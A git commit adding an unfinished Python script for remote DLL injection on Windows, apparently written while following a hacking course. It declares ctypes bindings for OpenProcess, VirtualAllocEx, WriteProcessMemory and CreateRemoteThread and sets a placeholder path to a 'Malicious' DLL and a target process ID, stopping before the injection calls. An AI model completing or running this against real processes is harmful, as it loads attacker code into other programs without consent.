399be78e3fafb70394a3b15bea2d400f6597c3f3
jsgreen90 <42043637+jsgreen90@users.noreply.github.com>
2022-02-24 16:53:00 -0500

    Create RemoteDLLInjection.py

---
+++ Penetration-Testing/RemoteDLLInjection.py
@@ -0,0 +1,54 @@
+# Remote DLL Injection - UNDER CONSTRUCTION FOR COMPLETION OF TESTING
+# Credit goes to TCM Python 201 For Hackers Course
+
+from ctypes import *
+from ctypes import wintypes
+
+kernel32 = windll.kernel32
+LPCTSTR = c_char_p
+SIZE_T = c_size_t
+
+#Create our functions - based on the msdn pages for each windows function which show the arg types and return values
+OpenProcess = kernel32.OpenProcess
+OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
+OpenProcess.restype = wintypes.HANDLE
+
+VirtualAllocEx = kernel32.VirtualAllocEx
+VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
+VirtualAllocEx.restype = wintypes.LPVOID
+
+WriteProcessMemory = kernel32.WriteProcessMemory
+WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
+WriteProcessMemory.restype = wintypes.BOOL
+
+GetModuleHandle = kernel32.GetModuleHandle
+GetModuleHandle.argtypes = (LPCTSTR, )
+GetModuleHandle.restype = wintypes.HANDLE
+
+GetProcAddress = kernel32.GetProcAddress
+GetProcAddress.argtypes = (wintypes.HMODULE, LPCTSTR)
+GetProcAddress.restype = wintypes.LPVOID
+
+class _SECURITY_ATTRIBUTES(Structure):
+    _fields_ = [('nLength', wintypes.DWORD),
+                ('lpSecurityDescriptor', wintypes.LPVOID),
+                ('bInheritHandle', wintypes.BOOL)]
+
+SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
+LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
+LPTHREAD_START_ROUTINE = wintypes.LPVOID
+
+CreateRemoteThread = kernel32.CreateRemoteThread
+CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
+CreateRemoteThread.restype = wintypes.HANDLE
+
+#Constants for working with memory, can be found at https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex and 
+# https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
+MEM_COMMIT = 0x00001000
+MEM_RESERVE = 0x00002000
+PAGE_READWRITE = 0x04
+EXECUTE_IMMEDIATELY = 0x0
+PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)
+
+dll = b"C:\Path\To\Malicious\DLL"
+pid = 9999 # process ID of process you want to inject into
